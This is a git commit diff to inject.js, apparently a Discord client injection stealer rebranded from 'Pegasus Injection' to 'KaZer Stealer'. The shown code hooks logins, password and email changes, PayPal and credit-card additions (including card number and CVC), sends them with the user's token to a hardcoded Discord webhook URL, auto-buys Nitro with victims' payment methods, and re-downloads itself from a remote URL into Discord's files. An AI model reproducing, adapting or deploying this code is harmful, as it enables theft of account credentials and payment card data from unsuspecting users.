b6f4250f7b707e0e2e8a52ad02ee57219f80f1e4
KaZer <106706522+KaZerCfx@users.noreply.github.com>
2022-11-12 18:30:49 +0100

    Update inject.js

--- inject.js
+++ inject.js
@@ -10,7 +10,7 @@ const config = {
   auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
   ping_val: "@here", //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-  embed_name: "Pegasus Injection", //name of the webhook thats gonna send the info
+  embed_name: " KaZer Stealer", //name of the webhook thats gonna send the info
   embed_icon: "https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg".replace(/ /g, "%20"), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 14423100, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   injection_url: "https://raw.githubusercontent.com/KaZerCfx/INject/main/inject.js", //injection url for when it reinjects
@@ -112,7 +112,7 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace('%WEBHOOK%', '${config.webhook}')
+        res.replace('https://discord.com/api/webhooks/1040965742272712724/16hhQ3ftocsJMIahkcvwLquukbrosoa2_Qex9da1buwX_--O-dRTORcBBK6PF_dWWK4s')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
@@ -342,7 +342,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "@KaZer Stealer",
         },
       },
     ],
@@ -384,7 +384,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "@KaZer Stealer",
         },
       },
     ],
@@ -426,7 +426,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "@KaZer Stealer",
         },
       },
     ],
@@ -468,7 +468,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "@KaZer Stealer",
         },
       },
     ],
@@ -510,7 +510,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "@KaZer Stealer",
         },
       },
     ],
@@ -554,7 +554,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "KaZer Stealer",
         },
       },
     ],
